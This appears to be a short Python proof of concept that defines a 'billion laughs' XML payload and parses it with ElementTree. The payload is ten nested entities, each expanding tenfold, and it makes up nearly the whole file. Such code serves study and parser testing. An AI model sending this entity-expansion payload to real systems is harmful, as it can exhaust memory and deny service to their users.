import xml.etree.ElementTree as ET

# Vulnerable XML input with a large number of entities
xml_input = """<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY a "A">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
    <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
    <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
    <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
    <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
    <!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
]>
<root>&j;</root>
"""

# Parse the XML input
try:
    tree = ET.fromstring(xml_input)
except ET.ParseError as e:
    print(f"Error parsing XML: {e}")